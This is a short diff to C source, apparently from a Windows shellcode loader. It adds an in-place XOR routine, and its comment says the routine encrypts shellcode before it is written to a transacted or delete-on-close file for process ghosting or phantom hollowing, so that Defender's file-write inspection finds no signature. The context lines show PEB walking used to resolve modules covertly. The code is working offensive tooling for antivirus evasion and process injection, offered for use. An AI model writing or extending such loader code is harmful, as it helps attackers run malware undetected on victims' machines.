@@ -122,6 +122,20 @@ INT StrCmpA(IN LPCSTR Str1, IN LPCSTR Str2) {
 }
 
 // -----------------------------------------------
+// In-place XOR over pBuf with cycling fixed-length key.
+// Used by Phantom/Ghost placement: encrypt shellcode bytes
+// before writing them to a transacted / delete-on-close
+// file, then decrypt in memory after section mapping. The
+// file-write step is what Defender's MpFilter content-
+// inspects; encrypted bytes there produce no signature hit.
+// -----------------------------------------------
+VOID XorBufferInPlace(IN OUT PBYTE pBuf, IN DWORD dwSize, IN PBYTE pKey, IN DWORD dwKeyLen) {
+    if (!pBuf || !pKey || dwKeyLen == 0) return;
+    for (DWORD i = 0; i < dwSize; i++)
+        pBuf[i] ^= pKey[i % dwKeyLen];
+}
+
+// -----------------------------------------------
 // Walk PEB to find a loaded module by its upper-case
 // BaseDllName (e.g. L"NTDLL.DLL"). Case-insensitive:
 // compares name byte-by-byte after uppercasing.
